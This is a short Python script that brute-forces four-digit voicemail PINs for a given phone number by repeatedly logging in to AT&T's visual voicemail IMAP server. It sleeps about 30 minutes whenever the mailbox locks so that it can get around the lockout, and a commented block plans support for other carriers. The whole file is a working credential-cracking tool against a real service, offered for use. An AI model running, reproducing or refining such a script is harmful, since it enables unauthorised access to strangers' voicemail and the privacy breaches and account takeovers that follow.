import imaplib
import sys
import time

tarNum = sys.argv[1]

"""carrier = sys.argv[2]

carrierServer = {"att":"vvm.mobile.att.net","tmobile":"??","verizon":"???"} #not utilized yet as i dont have the imap server for tmobile and verizon
carrierSleep = {"att":1204,"tmobile":0,"verizon":0}

carr = carrierServer[carrier]

"""

def crack(number,x):
    try:
        imap1 = imaplib.IMAP4("vvm.mobile.att.net",143)
        imap1.login(number,x)
        imap1.close()
        return x
    except Exception as err:
        if "blocked" in str(err) or "locked" in str(err):
            return 2
        else:
            return 3

for p in range(9999):
    passw = str(p).zfill(4)
    att = crack(tarNum,passw)
    if att != 2 and (att != 3):
        print("[+] "+str(passw))
        break
    elif att == 2:
        print("[!] Mailbox locked. Sleeping for 30 minutes...")
        time.sleep(1804) #30 minutes seems to work for at&t
    elif att == 3:
        print("[-] "+str(passw))
    else:
        print("[!] Unknown error. Maybe check your internet connection? Exiting...")
        break

